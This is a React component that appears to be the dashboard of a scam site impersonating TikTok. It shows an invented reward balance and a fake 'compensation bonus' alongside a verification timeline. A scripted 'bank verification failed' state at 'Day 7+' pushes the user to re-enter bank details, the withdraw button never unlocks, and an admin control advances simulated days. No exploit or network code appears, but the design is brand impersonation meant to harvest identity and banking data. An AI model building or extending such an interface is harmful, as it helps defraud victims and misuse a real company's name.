import { useState, useEffect, useMemo } from "react";
import {
  ArrowUpRight,
  CheckCircle,
  AlertTriangle,
  XCircle,
  Wallet,
  Building,
  ChevronRight,
  DollarSign,
  ShieldCheck,
  Clock,
  RefreshCw,
  Loader2,
  Gift,
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Skeleton } from "@/components/ui/skeleton";
import { useWalletStatus, type ReviewStage, type ActivityEvent } from "@/hooks/useWalletStatus";
import { format } from "date-fns";
import TikTokHeader from "./TikTokHeader";
import AdminTimeControl from "./AdminTimeControl";

interface DashboardScreenProps {
  userName: string;
  onReverifyBank?: () => void;
  onFullReset?: () => void;
}

const DashboardSkeleton = () => (
  <div className="min-h-screen flex flex-col bg-surface">
    <TikTokHeader showHelp />
    <div className="flex-1 px-6 py-4">
      <Skeleton className="h-4 w-40 mb-4" />
      <Skeleton className="h-40 w-full rounded-2xl mb-5" />
      <Skeleton className="h-24 w-full rounded-xl mb-4" />
      <Skeleton className="h-12 w-full rounded-full mb-4" />
      <div className="my-6">
        <Skeleton className="h-px w-full" />
      </div>
      <Skeleton className="h-5 w-44 mb-2" />
      <Skeleton className="h-20 w-full rounded-xl mb-2" />
      <Skeleton className="h-20 w-full rounded-xl" />
    </div>
  </div>
);

// --- Timeline ---

const STAGE_ORDER: ReviewStage[] = [
  "doc_received",
  "doc_reviewing",
  "doc_approved",
  "bank_verifying",
  "bank_completed",
];

const stageStatus = (
  stage: ReviewStage,
  current: ReviewStage,
  failed: boolean
): "complete" | "current" | "pending" => {
  if (failed && stage === "bank_completed") return "pending";
  if (failed && stage === "bank_verifying") return "current";
  const stageIdx = STAGE_ORDER.indexOf(stage);
  const currentIdx = STAGE_ORDER.indexOf(current);
  if (stageIdx < currentIdx) return "complete";
  if (stageIdx === currentIdx) return "current";
  return "pending";
};

const TimelineStepRow = ({
  step,
  status,
  isLast,
}: {
  step: { label: string; description: string };
  status: "complete" | "current" | "pending";
  isLast: boolean;
}) => {
  const dotClass =
    status === "complete"
      ? "bg-success/15 text-success border-success/40"
      : status === "current"
      ? "bg-warning/15 text-warning border-warning/40"
      : "bg-muted text-muted-foreground border-border";

  const lineClass = status === "complete" ? "bg-success/40" : "bg-border/40";

  return (
    <div className="flex gap-3.5">
      <div className="flex flex-col items-center">
        <div className={`w-8 h-8 rounded-full border-2 flex items-center justify-center shrink-0 transition-all ${dotClass}`}>
          {status === "complete" ? (
            <CheckCircle className="w-4 h-4" />
          ) : status === "current" ? (
            <Loader2 className="w-4 h-4 animate-spin" />
          ) : (
            <div className="w-2 h-2 rounded-full bg-current opacity-40" />
          )}
        </div>
        {!isLast && <div className={`w-0.5 flex-1 my-1 rounded-full ${lineClass} min-h-[24px]`} />}
      </div>
      <div className={`flex-1 pb-5 ${isLast ? "pb-0" : ""}`}>
        <p className={`text-sm font-semibold ${
          status === "pending" ? "text-muted-foreground" : "text-foreground"
        }`}>
          {step.label}
        </p>
        <p className={`text-xs mt-0.5 ${
          status === "pending" ? "text-muted-foreground/60" : "text-muted-foreground"
        }`}>
          {step.description}
        </p>
      </div>
    </div>
  );
};

const FailedTimelineStep = () => (
  <div className="flex gap-3.5">
    <div className="flex flex-col items-center">
      <div className="w-8 h-8 rounded-full border-2 border-destructive/40 bg-destructive/15 text-destructive flex items-center justify-center shrink-0">
        <XCircle className="w-4 h-4" />
      </div>
    </div>
    <div className="flex-1">
      <div className="flex items-center justify-between gap-2">
        <p className="text-sm font-semibold text-destructive">Bank Verification Failed</p>
        <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full bg-destructive/10 text-destructive whitespace-nowrap">
          Day 7+
        </span>
      </div>
      <p className="text-xs mt-0.5 text-muted-foreground">
        We couldn&apos;t verify your bank details. Please re-enter your withdrawal information to continue.
      </p>
    </div>
  </div>
);

// --- Activity feed ---

const activityIcons: Record<ActivityEvent["icon"], typeof ShieldCheck> = {
  shield: ShieldCheck,
  check: CheckCircle,
  alert: AlertTriangle,
  clock: Clock,
  bank: Building,
  refresh: RefreshCw,
  gift: Gift,
};

const ActivityRow = ({ event }: { event: ActivityEvent }) => {
  const Icon = activityIcons[event.icon];
  const iconColor =
    event.icon === "alert" ? "text-destructive bg-destructive/10"
    : event.icon === "check" ? "text-success bg-success/10"
    : event.icon === "gift" ? "text-success bg-success/10"
    : event.icon === "shield" ? "text-primary bg-primary/10"
    : event.icon === "bank" ? "text-primary bg-primary/10"
    : "text-muted-foreground bg-secondary";

  return (
    <div className="flex items-start gap-3 py-3">
      <div className={`w-8 h-8 rounded-full flex items-center justify-center shrink-0 ${iconColor}`}>
        <Icon className="w-4 h-4" />
      </div>
      <div className="flex-1 min-w-0">
        <div className="flex items-center justify-between gap-2">
          <p className="text-sm font-medium truncate">{event.label}</p>
          <span className="text-[10px] text-muted-foreground/70 whitespace-nowrap shrink-0">{event.timestamp}</span>
        </div>
        <p className="text-xs text-muted-foreground mt-0.5">{event.description}</p>
      </div>
    </div>
  );
};

// --- Main component ---

const DashboardScreen = ({ userName, onReverifyBank, onFullReset }: DashboardScreenProps) => {
  const [refreshKey, setRefreshKey] = useState(0);
  const status = useWalletStatus(refreshKey);
  const [loading, setLoading] = useState(true);

  const loginDate = useMemo(() => {
    const ts = localStorage.getItem("wallet_login_ts");
    if (ts) {
      const days = Math.floor((Date.now() - Number(ts)) / (1000 * 60 * 60 * 24));
      if (days === 0) return "Today";
      const d = new Date(Number(ts));
      d.setDate(d.getDate() + days);
      return format(d, "MMM dd, yyyy");
    }
    return "Today";
  }, [refreshKey]);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 300);
    return () => clearTimeout(timer);
  }, []);

  if (loading) return <DashboardSkeleton />;

  const canWithdraw = status.docStatus === "approved" && status.cashoutStatus === "completed";
  const failed = status.cashoutStatus === "failed";

  // Build the timeline rows: skip bank_completed if failed, show failed step at the end
  const visibleTimeline = status.timeline.filter((s) => {
    if (failed && s.id === "bank_completed") return false;
    if (failed && s.id === "bank_failed") return false; // handled separately
    return STAGE_ORDER.includes(s.id as ReviewStage);
  });

  return (
    <div className="min-h-screen flex flex-col bg-surface animate-fade-in">
      <TikTokHeader showHelp />

      <div className="flex-1 px-5 py-5 space-y-5">
        <p className="text-sm text-muted-foreground">
          Welcome back, <strong className="text-foreground">{userName}!</strong>
        </p>

        {/* Balance card */}
        <div className="relative rounded-2xl bg-gradient-to-br from-foreground via-foreground/95 to-foreground/85 text-primary-foreground p-6 shadow-xl overflow-hidden">
          <DollarSign className="absolute top-4 right-4 w-16 h-16 opacity-[0.06]" strokeWidth={1.5} />
          <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/[0.03] to-white/[0.08] pointer-events-none" />
          <p className="text-[11px] uppercase tracking-widest opacity-60 mb-3 relative z-10">Available Balance</p>
          <p className="text-[44px] font-bold tracking-tighter leading-none relative z-10">
            ${(status.hasBonus ? 3343.27 : 2893.27).toLocaleString("en-US", { minimumFractionDigits: 2 })}
          </p>
          {status.hasBonus && (
            <p className="text-[10px] text-emerald-300 mt-2 relative z-10 flex items-center gap-1">
              <Gift className="w-3 h-3" />
              Includes $450.00 compensation bonus
            </p>
          )}
          <div className="flex items-center gap-2 mt-3 relative z-10">
            <span className={`text-[10px] px-2.5 py-1 rounded-full font-semibold ${
              failed
                ? "bg-destructive/20 text-red-200"
                : canWithdraw
                ? "bg-success/20 text-emerald-200"
                : "bg-warning/20 text-amber-200"
            }`}>
              {failed ? "Action Required" : canWithdraw ? "Ready to Withdraw" : "Verification in Progress"}
            </span>
            {!failed && !canWithdraw && (
              <span className="text-[10px] opacity-50">{status.estimatedCompletion}</span>
            )}
          </div>
        </div>

        {/* Failed alert — actionable re-verification CTA */}
        {failed && (
          <div className="rounded-2xl border border-destructive/30 bg-destructive/5 p-4 space-y-3">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
              <div>
                <p className="text-sm font-semibold text-destructive">Bank verification failed</p>
                <p className="text-xs text-muted-foreground mt-1">
                  Your bank details couldn&apos;t be verified by our payment processor. This sometimes happens due to incorrect routing numbers or bank restrictions. Please re-enter your withdrawal details to restart verification.
                </p>
              </div>
            </div>
            {onReverifyBank && (
              <Button
                onClick={onReverifyBank}
                className="w-full h-12 rounded-full text-sm font-semibold"
                variant="destructive"
              >
                <RefreshCw className="w-4 h-4 mr-2" />
                Re-enter Bank Details
              </Button>
            )}
          </div>
        )}

        {/* Verification Timeline */}
        <div className="p-5 rounded-2xl border border-border/60 bg-card shadow-sm">
          <div className="flex items-center justify-between mb-4">
            <p className="text-[11px] uppercase tracking-widest text-muted-foreground font-semibold">Verification Progress</p>
            {!failed && !canWithdraw && (
              <span className="text-[10px] text-muted-foreground">{status.estimatedCompletion}</span>
            )}
          </div>
          {visibleTimeline.map((step, i) => {
            const s = stageStatus(step.id as ReviewStage, status.currentStage, failed);
            return (
              <TimelineStepRow
                key={step.id}
                step={step}
                status={s}
                isLast={i === visibleTimeline.length - 1 && !failed}
              />
            );
          })}
          {failed && <FailedTimelineStep />}
        </div>

        {/* Withdraw button */}
        <div>
          <Button
            disabled={!canWithdraw}
            className={`w-full h-12 rounded-full text-sm font-bold transition-all ${
              canWithdraw
                ? "bg-gradient-to-r from-foreground to-foreground/80 hover:from-foreground/90 hover:to-foreground/70 shadow-lg"
                : ""
            }`}
          >
            <Wallet className="w-4 h-4 mr-2" />
            Withdraw Funds
          </Button>
          {!canWithdraw && !failed && (
            <p className="text-xs text-muted-foreground text-center mt-2 flex items-center justify-center gap-1">
              <Clock className="w-3 h-3 text-warning" />
              {status.estimatedCompletion}
            </p>
          )}
          {failed && (
            <p className="text-xs text-destructive text-center mt-2">
              Resolve bank verification to unlock withdrawal
            </p>
          )}
          {!canWithdraw && !failed && !status.needsReverification && (
            <p className="text-[11px] text-muted-foreground/70 text-center mt-1.5">
              Complete identity & bank verification first to unlock withdrawal
            </p>
          )}
        </div>

        {/* Separator */}
        <div className="h-px bg-border/40" />

        {/* Activity Feed */}
        <div>
          <h2 className="text-lg font-semibold mb-1">Recent activity</h2>
          <p className="text-xs text-muted-foreground mb-2">Updates about your verification and account.</p>
          <div className="rounded-2xl border border-border/60 bg-card shadow-sm px-4 divide-y divide-border/30">
            {status.activities.map((event) => (
              <ActivityRow key={event.id} event={event} />
            ))}
          </div>
        </div>

        {/* Separator */}
        <div className="h-px bg-border/40" />

        {/* Transactions */}
        <div>
          <h2 className="text-lg font-semibold mb-1">Transaction history</h2>
          <p className="text-xs text-muted-foreground mb-4">Review your past transactions and their status.</p>

          <div className="rounded-2xl border border-border/60 overflow-hidden bg-card shadow-sm">
            <div className="flex items-center gap-3.5 px-4 py-4 border-b border-border/40 hover:bg-accent/40 transition-colors cursor-pointer group">
              <div className={`flex items-center justify-center w-11 h-11 rounded-full shrink-0 ${
                failed ? "bg-destructive/10" : "bg-warning/10"
              }`}>
                {failed ? (
                  <XCircle className="w-5 h-5 text-destructive" />
                ) : (
                  <ArrowUpRight className="w-5 h-5 text-warning" />
                )}
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 mb-0.5">
                  <p className="text-sm font-semibold">Cashout</p>
                  <Badge variant="outline" className={`text-[9px] px-1.5 py-0 h-4 font-semibold border ${
                    failed
                      ? "bg-destructive/10 text-destructive border-destructive/20"
                      : "bg-warning/10 text-warning border-warning/20"
                  }`}>
                    {failed ? "Failed" : "Processing"}
                  </Badge>
                </div>
                <p className="text-xs text-muted-foreground">{loginDate}</p>
              </div>
              <span className="text-sm font-bold text-destructive whitespace-nowrap">
                -${(status.hasBonus ? 3343.27 : 2893.27).toLocaleString("en-US", { minimumFractionDigits: 2 })}
              </span>
              <ChevronRight className="w-4 h-4 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity" />
            </div>

            <div className="flex items-center gap-3.5 px-4 py-4 hover:bg-accent/40 transition-colors cursor-pointer group">
              <div className="flex items-center justify-center w-11 h-11 rounded-full bg-success/10 shrink-0">
                <CheckCircle className="w-5 h-5 text-success" />
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 mb-0.5">
                  <p className="text-sm font-semibold">Reward</p>
                  <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 font-semibold border bg-success/10 text-success border-success/20">
                    Completed
                  </Badge>
                </div>
                <p className="text-xs text-muted-foreground">{loginDate}</p>
              </div>
              <span className="text-sm font-bold text-success whitespace-nowrap">
                +${(status.hasBonus ? 3343.27 : 2893.27).toLocaleString("en-US", { minimumFractionDigits: 2 })}
              </span>
              <ChevronRight className="w-4 h-4 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity" />
            </div>

            {status.hasBonus && (
              <div className="flex items-center gap-3.5 px-4 py-4 border-t border-border/40 hover:bg-accent/40 transition-colors cursor-pointer group">
                <div className="flex items-center justify-center w-11 h-11 rounded-full bg-success/10 shrink-0">
                  <Gift className="w-5 h-5 text-success" />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-0.5">
                    <p className="text-sm font-semibold">Compensation Bonus</p>
                    <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 font-semibold border bg-success/10 text-success border-success/20">
                      Credited
                    </Badge>
                  </div>
                  <p className="text-xs text-muted-foreground">Verification delay compensation</p>
                </div>
                <span className="text-sm font-bold text-success whitespace-nowrap">+$450.00</span>
                <ChevronRight className="w-4 h-4 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity" />
              </div>
            )}
          </div>
        </div>
      </div>

      <AdminTimeControl
        currentDay={status.daysSinceLogin}
        onDayChange={() => setRefreshKey((k) => k + 1)}
        onFullReset={onFullReset}
      />

      <footer className="py-4 text-center border-t border-border/40 space-y-2.5">
        <div className="flex items-center justify-center gap-3 text-[10px] text-muted-foreground/70">
          <a href="#" className="hover:text-foreground transition-colors">Terms of Service</a>
          <span>·</span>
          <a href="#" className="hover:text-foreground transition-colors">Privacy Policy</a>
          <span>·</span>
          <a href="#" className="hover:text-foreground transition-colors">Help Center</a>
        </div>
        <span className="text-xs text-muted-foreground/60 block">© 2026 TikTok</span>
      </footer>
    </div>
  );
};

export default DashboardScreen;
